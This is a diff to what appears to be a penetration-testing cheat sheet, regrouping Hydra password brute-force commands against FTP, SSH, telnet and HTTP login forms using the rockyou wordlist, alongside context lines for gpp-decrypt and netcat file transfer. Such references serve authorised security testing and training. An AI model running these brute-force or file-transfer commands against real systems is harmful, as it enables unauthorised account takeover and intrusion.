@@ -85,12 +85,6 @@ ssh <username@ip>
   ```
   gpp-decrypt <code>
   ```
-  * Hydra
-  ```
-  hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp
-  hydra -v -V -u -L users.txt -P /usr/share/wordlists/rockyou.txt -t 1 -u <ip> ssh
-  hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> -V http-form-post "/login.php:<request>:<wrong_message>''"
-  ```
 * Send a file using netcat
   * send    
   ```
@@ -101,13 +95,11 @@ ssh <username@ip>
   nc -w 3 <ip> > <outputfilename>
   ```
 * Brute Force
-  * ssh
   ```
   hydra -l <user.txt> -p <pass.txt> <ip> ssh
-  ```
-  * telnet
-  ```
-  hydra -l root -P <password.txt> <ip> telnet
+  hydra -l root -P <password.txt> <ip> telnet  
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> ftp
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> -V http-form-post "/login.php:<request>:<wrong_message>''"
   ```
  * Powershell Download
  ```
